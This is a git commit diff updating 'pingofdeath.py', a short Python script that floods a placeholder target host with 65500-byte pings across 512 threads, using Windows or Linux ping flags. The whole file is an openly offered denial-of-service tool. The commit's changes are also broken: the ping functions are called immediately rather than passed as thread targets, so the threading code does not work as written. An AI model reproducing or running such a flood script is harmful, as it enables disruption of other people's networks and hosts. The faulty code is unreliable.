1d3bc623de948a1d0b26c506187c5c0effcfc980
Stoned Paul <45460445+StonedPaul@users.noreply.github.com>
2021-06-15 01:42:21 -0600

    Update pingofdeath.py

--- pingofdeath.py
+++ pingofdeath.py
@@ -1,13 +1,16 @@
 import os
 import threading
+import random
+import time
 def Wping():
     os.system(f"ping ATTACKTARGETHERE -t -l 65500")
 def Lping():
     os.system(f"ping ATTACKTARGETHERE -s 65500")
-#print("ping spammer??"+(5000*'[]'))
-option = 'Lping'
+option = Lping()
+for s in range(6550):
+    print(random.choice('@#0\t'), end="")
 if os.name == 'nt':
-    option = 'Wping'
+    option = Wping()
 for i in range(512):
-    thead = threading.Thread(target=f'{option}',name=f'TH{i}')
+    thead = threading.Thread(target=option, name=f'TH{i}')
     thead.start()
